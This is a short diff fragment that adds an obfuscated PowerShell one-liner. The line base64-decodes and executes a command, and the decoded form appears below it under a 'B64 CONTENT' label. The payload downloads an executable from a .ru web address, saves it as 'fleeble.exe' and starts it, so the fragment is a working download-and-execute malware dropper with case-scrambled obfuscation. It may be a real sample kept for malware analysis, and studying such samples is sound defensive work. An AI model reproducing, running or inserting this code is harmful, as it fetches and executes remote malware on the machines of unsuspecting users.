@@ -1,0 +1,7 @@
+iex([SysTem.text.EncodiNg]::UTF8.GEtstriNg([System.cOnvert]::FrOMbaSE64stRing('CihOZXctT2JqZWN0IFN5c1RFTS5uZXQud2ViQ0xpZU5UKS5kT1dubE9BRGZJbEUoJ2h0dHA6Ly93d3cud3ZobWVkaWNpbmUucnUvMS9QMi5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysTEM.net.webCLieNT).dOWnlOADfIlE('http://www.wvhmedicine.ru/1/P2.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
